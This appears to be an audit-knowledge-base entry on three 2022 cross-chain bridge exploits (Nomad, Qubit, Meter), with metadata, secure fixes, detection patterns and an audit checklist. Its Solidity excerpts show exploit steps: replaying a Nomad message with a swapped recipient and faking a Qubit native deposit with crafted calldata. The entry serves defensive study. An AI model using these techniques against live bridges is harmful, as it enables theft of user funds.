---
# Core Classification
protocol: "generic"
chain: "ethereum, bsc, moonriver"
category: "bridge"
vulnerability_type: "bridge_verification_bypass"

# Attack Vector Details
attack_type: "logical_error"
affected_component: "message_verification, deposit_validation, cross_chain_relay"

# Technical Primitives
primitives:
  - "merkle_root"
  - "message_proof"
  - "zero_hash"
  - "address_zero"
  - "msg_value_validation"
  - "native_token_wrapping"
  - "cross_chain_relay"
  - "deposit_handler"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.8
financial_impact: "critical"

# Context Tags
tags:
  - "bridge"
  - "cross-chain"
  - "verification"
  - "message_passing"
  - "native_token"
  - "deposit"
  - "relay"

# Version Info
language: "solidity"
version: ">=0.8.0"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [NOM-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-08/NomadBridge_exp.sol` |
| [QUB-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-01/Qubit_exp.sol` |
| [MET-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-02/Meter_exp.sol` |

---

# Bridge Verification Bypass Attack Patterns (2022)

## Overview

Cross-chain bridge exploits in 2022 resulted in over **$274M** in losses by exploiting fundamental flaws in message verification, deposit validation, and native token handling. These attacks fall into three categories: (1) faulty initialization enabling zero-hash proof bypass (Nomad $190M), (2) native token deposit fakery via `address(0)` whitelisting without `msg.value` validation (Qubit $80M), and (3) native/ERC20 token wrapping inconsistencies in deposit handlers (Meter $4.4M). Bridge exploits remain among the highest-impact DeFi attacks because a single verification bypass exposes the entire bridge's liquidity.

---

## 1. Zero-Hash Trusted Root — Message Proof Bypass

### Root Cause

During a routine upgrade, the Nomad Replica contract was initialized with a trusted root of `0x00` (zero hash). In the message verification logic, any unproven message defaults to `bytes32(0)` for its proof root. Since `messages[0x00]` was now mapped to `MessageStatus.Proven`, **any arbitrary message** could be processed as valid without actual proof verification. An attacker simply needed to copy a legitimate bridge message, replace the recipient address, and call `process()`.

### Attack Scenario

1. Find a legitimate past bridge transaction (e.g., WBTC transfer from Moonbeam → Ethereum)
2. Copy the raw message bytes from the transaction calldata
3. Replace the recipient address field with attacker's address
4. Call `Replica.process(modifiedMessage)` — processes successfully
5. BridgeRouter releases tokens to attacker
6. Repeat for any token and amount — the zero hash makes ALL messages valid

### Vulnerable Pattern Examples

**Example 1: Nomad Bridge — Zero-Hash Message Validation ($190M, August 2022)** [Approx Vulnerability: CRITICAL] `@audit` [NOM-POC]

```solidity
// ❌ VULNERABLE: Replica initialized with trusted root = 0x00
// Any arbitrary message processes as valid because unproven messages default to bytes32(0)

// The Replica.process() flow:
// 1. Look up message hash → get root it was "proven" against
// 2. Check if root is trusted: confirmAt[root] != 0
// 3. After upgrade: confirmAt[bytes32(0)] was set to non-zero (trusted!)
// So any message that was never explicitly proven → root = 0x00 → trusted!

// Attacker copies a legitimate WBTC bridge message and replaces recipient:
bytes memory msgP1 = hex"6265616d0000000000000000000000..."; // Original message prefix
bytes memory recvAddr = abi.encodePacked(address(this));      // @audit Replace recipient
bytes memory msgP2 = hex"...02540be400...";                   // 100 WBTC amount

bytes memory _message = bytes.concat(msgP1, recvAddr, msgP2);
bool suc = Replica.process(_message);
// @audit Processes successfully — 100 WBTC sent to attacker
// This was replayed HUNDREDS of times by different attackers, draining $190M total

// The message structure decoded:
// chainId: "beam" (Moonbeam source domain)
// sender: original sender (doesn't matter)
// recipientAddress: BridgeRouter (calls handle() to release tokens)
// _domain, _id: WBTC token identifier
// _to: ATTACKER address (replaced from original)
// _amnt: 100 * 1e8 (100 WBTC)
```

---

## 2. Native Token Deposit Fakery — address(0) Whitelisting

### Root Cause

Qubit's QBridge mapped the ETH `resourceID` to `address(0)` in the deposit handler, and `address(0)` was whitelisted in `contractWhitelist`. The `deposit()` function did not validate that actual ETH was sent (`msg.value` check) when the resolved token address was `address(0)`. This allowed an attacker to call `deposit()` with ETH's resource ID and an arbitrary amount encoded in calldata, without sending any ETH. The relayer network observed the `Deposit` event on Ethereum and credited the fake amount on BSC.

### Vulnerable Pattern Examples

**Example 2: Qubit QBridge — Fake Native Deposit via address(0) ($80M, January 2022)** [Approx Vulnerability: CRITICAL] `@audit` [QUB-POC]

```solidity
// ❌ VULNERABLE: address(0) whitelisted + no msg.value validation for native deposits
// Deposit "3,077 ETH" without sending any actual ETH

// resourceID resolves to address(0) — which is whitelisted!
bytes32 resourceID = hex"00000000000000000000002f422fe9ea622049d6f73f81a906b9b8cff03b7f01";

// @audit Verify the vulnerability:
address resolved = IQBridgeHandler(QBridgeHandler).resourceIDToTokenContractAddress(resourceID);
// resolved == address(0)
bool isWhitelisted = IQBridgeHandler(QBridgeHandler).contractWhitelist(address(0));
// isWhitelisted == true

// Encoded deposit data: option=105, amount=3,077 ETH, recipient=attacker
bytes memory data = hex"0000000000000000000000000000000000000000000000000000000000000069"
                    hex"000000000000000000000000000000000000000000000a4cc799563c380000"
                    hex"000000000000000000000000d01ae1a708614948b2b5e0b7ab5be6afa01325c7";

// @audit deposit() succeeds with msg.value = 0!
// No check that actual ETH was sent for a native token deposit
IQBridge(QBridge).deposit(1, resourceID, data);

// Result: Deposit event emitted on Ethereum → BSC relayers credit 3,077 qXETH
// Attacker repeats to accumulate 77,162 qXETH → borrows all Qubit lending assets (~$80M)
```

---

## 3. Native Token Wrapping Bypass

### Root Cause

Bridge deposit handlers that support both native tokens (ETH/BNB) and ERC20 tokens must correctly enforce that `msg.value` matches the deposited amount for native token deposits. When the handler branches on token type but fails to enforce value consistency, an attacker can mix native and ERC20 deposit paths to credit native tokens without sending them, or to generate deposit events with fabricated amounts.

### Vulnerable Pattern Examples

**Example 3: Meter Bridge — Native Token Wrapping Bypass ($4.4M, February 2022)** [Approx Vulnerability: CRITICAL] `@audit` [MET-POC]

```solidity
// ❌ VULNERABLE: Chainbridge fork deposit handler doesn't enforce msg.value
// for native token deposits, allowing fabricated deposit amounts

// The Meter bridge handler has separate logic for:
// - ERC20 deposits: calls transferFrom(depositor, handler, amount)
// - Native deposits: should wrap msg.value into WETH/WBNB
// But the native deposit path doesn't validate msg.value == amount!

// Attacker exploits the wrapping bypass:
// 1. Call deposit with native token flag but msg.value = 0
// 2. Handler processes the deposit with the amount from calldata (not msg.value)
// 3. Deposit event emitted with fabricated amount

// On destination chain, relayers process the event:
// → Attacker receives wrapped native tokens on destination chain
// → Swaps for real assets

// The SushiSwap portion of the exploit on Moonriver:
address[] memory path = new address[](2);
path[0] = 0x8d3d13cac607B7297Ff61A5E1E71072758AF4D01;  // @audit Attacker as "token"
path[1] = 0x639A647fbe20b6c8ac19E48E2de44ea792c62c5C;  // Target token

sushiSwapRouter.call(
    abi.encodeWithSignature(
        "swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
        2_000_000_000_000_000_000_000, 15_206_528_022_953_775_301,
        path, attackerAddress, 1_644_074_232
    )
);
```

---

## Impact Analysis

### Technical Impact
- Complete bridge liquidity drainage via message replay (Nomad: $190M from single root bypass)
- Unlimited minting of wrapped tokens on destination chains without backing
- Deposit event spoofing allows relayer exploitation without any capital
- Once a bridge verification is bypassed, ALL locked assets across ALL token types are at risk

### Business Impact
- **Total losses 2022:** $274.4M (Nomad $190M, Qubit $80M, Meter $4.4M)
- Nomad was a "free-for-all" — hundreds of different addresses replayed the exploit
- Bridge exploits destroy cross-chain interoperability trust
- Recovery is extremely difficult since funds are dispersed across chains

### Affected Scenarios
- Message-passing bridges using merkle proof verification
- Bridges with native token deposit handlers (ETH, BNB, MATIC wrapping)
- Chainbridge forks with ERC20/native token handler branching
- Any bridge where deposit events on source chain trigger minting on destination chain
- Bridges with `address(0)` or sentinel values in token whitelists

---

## Secure Implementation

**Fix 1: Non-Zero Trusted Root Initialization**
```solidity
// ✅ SECURE: Never initialize trusted root to zero
// Explicit validation that root is non-trivial

contract SecureReplica {
    bytes32 public constant ZERO_HASH = bytes32(0);
    
    function initialize(bytes32 _committedRoot) external initializer {
        require(_committedRoot != ZERO_HASH, "Cannot use zero root");
        confirmAt[_committedRoot] = 1;
    }
    
    function process(bytes memory _message) external {
        bytes32 _messageHash = keccak256(_message);
        bytes32 _root = messages[_messageHash];
        
        // Reject unproven messages (root == 0 means not yet proven)
        require(_root != ZERO_HASH, "Message not proven");
        require(acceptableRoot(_root), "Root not trusted");
        // ...
    }
}
```

**Fix 2: Strict msg.value Validation for Native Deposits**
```solidity
// ✅ SECURE: Enforce msg.value matches deposit amount for native tokens
contract SecureBridgeHandler {
    function deposit(
        bytes32 resourceID, uint256 amount, bytes calldata data
    ) external payable {
        address tokenAddress = resourceIDToToken[resourceID];
        
        if (tokenAddress == address(0) || tokenAddress == NATIVE_TOKEN) {
            // Native token deposit — MUST match msg.value
            require(msg.value == amount, "msg.value mismatch");
            IWETH(weth).deposit{value: msg.value}();
        } else {
            // ERC20 deposit — must NOT accept native value
            require(msg.value == 0, "No ETH for ERC20 deposit");
            IERC20(tokenAddress).safeTransferFrom(msg.sender, address(this), amount);
        }
        
        require(amount > 0, "Zero amount");
        emit Deposit(resourceID, amount, msg.sender);
    }
}
```

**Fix 3: Message Uniqueness and Replay Protection**
```solidity
// ✅ SECURE: Track processed messages to prevent replay
contract SecureReplica {
    mapping(bytes32 => bool) public processedMessages;
    
    function process(bytes memory _message) external returns (bool) {
        bytes32 _messageHash = keccak256(_message);
        
        // Prevent replay
        require(!processedMessages[_messageHash], "Already processed");
        processedMessages[_messageHash] = true;
        
        // Verify proof
        bytes32 _root = messages[_messageHash];
        require(_root != bytes32(0), "Not proven");
        require(acceptableRoot(_root), "Root not trusted");
        
        // Process message
        _handle(_message);
        return true;
    }
}
```

---

## Detection Patterns

### Code Patterns to Look For
```
- Trusted root initialization to bytes32(0) or default values
- Message proof verification that passes for unproven messages
- `address(0)` in token whitelists or resource ID mappings
- Native token deposit handlers without msg.value validation
- Deposit functions where `amount` comes from calldata, not msg.value
- Missing replay protection (no processed message tracking)
- Chainbridge forks with native/ERC20 handler branching
- Bridge initialization functions that can be called multiple times
```

### Audit Checklist
- [ ] Is the trusted root initialized to a non-zero, legitimate value?
- [ ] Can unproven messages (root = 0) pass verification?
- [ ] Is `address(0)` excluded from token whitelists?
- [ ] Does native token deposit enforce `msg.value == amount`?
- [ ] Is there replay protection for processed messages?
- [ ] Are deposit events only emitted after successful token transfer?
- [ ] Is the bridge initialization function properly locked (initializer)?
- [ ] Are relayer signature validations sufficient (threshold, key freshness)?

---

## Real-World Examples

### Known Exploits
- **Nomad Bridge** — Zero-hash trusted root, message proof bypass, Ethereum — August 2022 — $190M
  - Root cause: Upgrade initialized `confirmAt[0x00]` to trusted, any message processsable
- **Qubit QBridge** — address(0) whitelisted, no msg.value check, Ethereum/BSC — January 2022 — $80M
  - Root cause: ETH resourceID → address(0) → whitelisted → fake deposits without sending ETH
- **Meter Bridge** — Native token wrapping bypass, Moonriver — February 2022 — $4.4M
  - Root cause: Chainbridge fork deposit handler mixed native/ERC20 paths incorrectly

### Related Major Bridge Exploits (Not in DeFiHackLabs)
- **Ronin Bridge** — Private key compromise, March 2022 — $625M
- **Harmony Horizon** — Multisig key compromise, June 2022 — $100M
- **Wormhole** — Signature verification bypass, February 2022 — $320M

---

## Prevention Guidelines

### Development Best Practices
1. Never initialize trusted roots to zero or default values
2. Explicitly reject unproven messages (require root != 0)
3. Remove `address(0)` from all whitelists and mappings
4. Enforce strict `msg.value == amount` for native token deposits
5. Implement replay protection for all processed messages
6. Use multi-party threshold signatures (not single-signer relayers)
7. Implement rate limiting and per-transaction size caps on bridge transfers
8. Deploy monitoring and pause mechanisms for anomalous bridge activity

### Testing Requirements
- Unit tests for: zero-hash root initialization, unproven message processing, address(0) deposits
- Integration tests for: cross-chain message replay, native vs ERC20 deposit paths
- Fuzzing targets: message encoding/decoding, proof verification, deposit handler branching
- Invariant tests: bridge token balance == sum of valid deposits - withdrawals

---

## Keywords for Search

> `bridge exploit`, `cross-chain attack`, `message proof bypass`, `zero hash`, `trusted root`, `Nomad bridge`, `Qubit bridge`, `Meter bridge`, `address zero whitelist`, `msg.value validation`, `native token deposit`, `deposit handler`, `Chainbridge fork`, `message replay`, `bridge verification`, `cross-chain relay`, `deposit event spoofing`, `bridge initialization`, `token wrapping bypass`, `resource ID`

---

## Related Vulnerabilities

- `DB/bridge/custom/defihacklabs-bridge-patterns.md` — 2021 bridge patterns
- `DB/general/initialization/defihacklabs-initialization-patterns.md` — Initialization flaws
- `DB/general/missing-validations/defihacklabs-input-validation-patterns.md` — Input validation
- `DB/bridge/` — All bridge-specific vulnerability entries
